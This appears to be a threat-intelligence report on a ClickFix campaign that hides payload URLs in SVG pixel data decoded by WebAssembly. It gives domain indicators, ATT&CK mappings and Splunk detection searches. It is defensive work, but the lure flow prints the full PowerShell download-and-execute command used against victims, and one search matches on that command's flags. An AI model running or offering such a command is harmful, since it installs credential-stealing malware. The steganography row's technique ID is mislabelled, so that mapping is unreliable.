---
scraped_at: 2026-07-15T00:00:00Z
source_url: https://raw.githubusercontent.com/PaloAltoNetworks/Unit42-timely-threat-intel/main/2026-07-15-ClickFix-campaign-using-wasm-and-steganography.txt
report_type: threat-intel
severity: medium
title: "ClickFix Campaign Using WebAssembly URL Decoding and SVG Steganography for Lure Page Evasion"
---

## 1. IOCs

### Domains — SVG Hosting (Compromised Legitimate Sites)

| Domain | Description |
|--------|-------------|
| `bridgehomeservices[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `circlehomeservices[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `dillonhomeservices[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `dundalkpestcontrol[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `razorbackroofing[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `ridgewellroofing[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `northlakeresearch[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `spurlockroofing[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |
| `waltonenvironmental[.]com` | Compromised legitimate site hosting malicious SVG with steganographically embedded payload URL |

### Domains — ClickFix Lure Delivery

| Domain | Description |
|--------|-------------|
| `leposeur[.]com` | ClickFix lure delivery domain; hosts WASM-powered fake CAPTCHA/verification page |
| `veridianroofing[.]com` | ClickFix lure delivery domain; hosts WASM-powered fake CAPTCHA/verification page |

### Domains — Payload Delivery

| Domain | Description |
|--------|-------------|
| `fashionblush[.]com` | Payload delivery domain; hosts PowerShell dropper script delivered via pastejacking |
| `xverikstat[.]us` | Payload delivery domain; secondary payload host and possible C2 for initial check-in |

## 2. TTPs

| Tactic | Technique ID | Technique Name | Usage |
|--------|-------------|----------------|-------|
| Initial Access | T1189 | Drive-by Compromise | Visitors to compromised legitimate sites (home services, roofing, pest control) are redirected to ClickFix lure pages via injected JavaScript |
| Defense Evasion | T1027 | Obfuscated Files or Information | Lure page uses a WebAssembly (WASM) module to decode the payload URL at runtime; URL is not present in plaintext JavaScript, evading static JS analysis and URL reputation checks |
| Defense Evasion | T1027.005 | Obfuscated Files or Information: Indicator Removal from Tools | Payload download URL embedded steganographically in SVG image pixel data hosted on compromised legitimate websites; URL cannot be extracted without executing the custom WASM decoder |
| Execution | T1204.001 | User Execution: Malicious Link | ClickFix lure instructs user to press Win+R, then paste a PowerShell one-liner from clipboard ("pastejacking"); user executes the command manually |
| Execution | T1059.001 | Command and Script Interpreter: PowerShell | PowerShell command injected into clipboard via `navigator.clipboard.writeText()`; command downloads and executes secondary stage from `fashionblush[.]com` |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Secondary payload beacons to `xverikstat[.]us` via HTTPS |

## 3. Malware & Tools

This campaign represents an evolution of the ClickFix social engineering technique (pastejacking) with two novel evasion additions designed to defeat URL reputation filtering and static lure-page analysis:

**1. WebAssembly (WASM) URL decoding:**

Rather than embedding the payload URL as a plaintext string in JavaScript (easily spotted by proxy category filters and JS static analysis), the lure page loads a custom `.wasm` binary module. The WASM module performs the URL decoding computation at runtime. The encoded URL itself is stored in the SVG pixel data of an image fetched from a compromised legitimate domain. Standard web security tools that scan JavaScript source for suspicious URLs see no URL; the WASM module computes it on the fly and uses it to write the PowerShell payload to the clipboard.

**2. SVG steganography:**

The payload URL is encoded in the least-significant bits of pixel color values in an SVG image hosted on a compromised legitimate website (home-services companies, roofing contractors, pest control businesses — low-traffic sites with lax security). The WASM module fetches this SVG via a cross-origin fetch, extracts the hidden data from pixel values, decodes the URL, and supplies it to the pastejacking mechanism.

**Lure page flow:**
1. Victim arrives at a ClickFix lure page on `leposeur[.]com` or `veridianroofing[.]com` (via malvertising, redirect from compromised site, or phishing link)
2. Page presents a standard fake CAPTCHA / "browser verification" overlay
3. WASM module loads; fetches SVG from a compromised legitimate site (e.g., `spurlockroofing[.]com`)
4. WASM extracts steganographic payload URL from SVG pixel data
5. Page instructs user to press Win+R and paste to complete "verification"; `navigator.clipboard.writeText()` writes the PowerShell one-liner to clipboard
6. User executes: `powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('hxxps://fashionblush[.]com/...')"` 
7. Script downloads and executes secondary stage payload; beacons to `xverikstat[.]us`

The secondary payload has not been publicly named. Unit 42 characterizes it as an infostealer with credential harvesting capabilities. The final payload is consistent with ClickFix campaigns tracked throughout 2026 delivering commodity infostealers (Lumma, Vidar, AMOS variants) and loaders.

**Detection note:** Because the endpoint behavioral outcome (PowerShell spawned from Win+R/Run dialog, or PowerShell running from explorer.exe/cmd.exe context) is identical to all prior ClickFix campaigns, existing detections for ClickFix user execution cover this technique variant. The WASM+steganography technique affects lure page construction only; it does not change the endpoint execution pattern. No new endpoint detection rule is required.

## 4. Threat Actor / Campaign Attribution

No attribution to a specific threat actor or group has been made by Unit 42. The campaign infrastructure and delivery method are consistent with commodity ClickFix-as-a-service operations observed throughout 2025–2026. The use of compromised legitimate small-business websites (home services, roofing, pest control) for SVG hosting is consistent with prior ClickFix and FakeUpdates infrastructure patterns used by DriveSurge and similar IABs, but no specific link has been confirmed.

## 5. Splunk Detection Searches

```spl
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
from datamodel=Network_Resolution.DNS
where DNS.query IN (
  "bridgehomeservices.com","circlehomeservices.com","dillonhomeservices.com",
  "dundalkpestcontrol.com","razorbackroofing.com","ridgewellroofing.com",
  "northlakeresearch.com","spurlockroofing.com","waltonenvironmental.com",
  "leposeur.com","veridianroofing.com","fashionblush.com","xverikstat.us"
)
by DNS.src DNS.query DNS.answer
| `drop_dm_object_name(DNS)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=case(
    match(query,"leposeur|veridianroofing|fashionblush|xverikstat"), 85,
    1=1, 65
  )
| where risk_score >= 65
| table firstTime lastTime src query answer risk_score
```

```spl
index=* (dest IN (
  "bridgehomeservices.com","circlehomeservices.com","dillonhomeservices.com",
  "dundalkpestcontrol.com","razorbackroofing.com","ridgewellroofing.com",
  "northlakeresearch.com","spurlockroofing.com","waltonenvironmental.com",
  "leposeur.com","veridianroofing.com","fashionblush.com","xverikstat.us"
))
| stats count min(_time) as firstTime max(_time) as lastTime by src dest dest_port
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=case(
    match(dest,"leposeur|veridianroofing|fashionblush|xverikstat"), 85,
    1=1, 65
  )
| where risk_score >= 65
| table firstTime lastTime src dest dest_port risk_score
```

```spl
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime
from datamodel=Endpoint.Processes
where Processes.process_name="powershell.exe"
  AND Processes.parent_process_name IN ("explorer.exe","cmd.exe","rundll32.exe")
  AND (Processes.process="*-w hidden*" OR Processes.process="*-ep bypass*"
       OR Processes.process="*DownloadString*" OR Processes.process="*IEX*")
by Processes.dest Processes.user Processes.parent_process_name
   Processes.process_name Processes.process Processes.process_id
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| eval risk_score=75
| where risk_score >= 75
| table firstTime lastTime dest user parent_process_name process_name process risk_score
```

## 6. Executive Summary

On July 15, 2026, Unit 42 published indicators from a ClickFix campaign using two novel evasion techniques: WebAssembly (WASM) URL decoding and SVG steganography. The campaign uses compromised legitimate small-business websites (nine identified, primarily home services and roofing companies) to host SVG images with payload URLs embedded steganographically in pixel data. ClickFix lure pages on `leposeur[.]com` and `veridianroofing[.]com` load a WASM module that fetches the SVG, extracts the hidden URL, and uses it to write a PowerShell download cradle to the victim's clipboard via pastejacking. The techniques are designed to evade URL reputation filtering and JavaScript static analysis tools that would otherwise detect the payload URL. The endpoint behavioral outcome — PowerShell spawned from explorer.exe/cmd.exe context with encoded or obfuscated download cradle — is identical to prior ClickFix campaigns. Payload delivery occurs via `fashionblush[.]com`; secondary C2 via `xverikstat[.]us`. No new endpoint detection is required beyond existing ClickFix behavioral rules. Organizations should block all 13 identified domains and monitor for WASM module loads from browser processes to unknown external origins as an additional indicator.

## References

- [Unit 42 Timely Threat Intel — ClickFix Campaign Using WASM and Steganography (2026-07-15)](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-07-15-ClickFix-campaign-using-wasm-and-steganography.txt)
- [MITRE ATT&CK T1189 — Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)
- [MITRE ATT&CK T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
- [MITRE ATT&CK T1204.001 — User Execution: Malicious Link](https://attack.mitre.org/techniques/T1204/001/)
- [MITRE ATT&CK T1059.001 — Command and Script Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
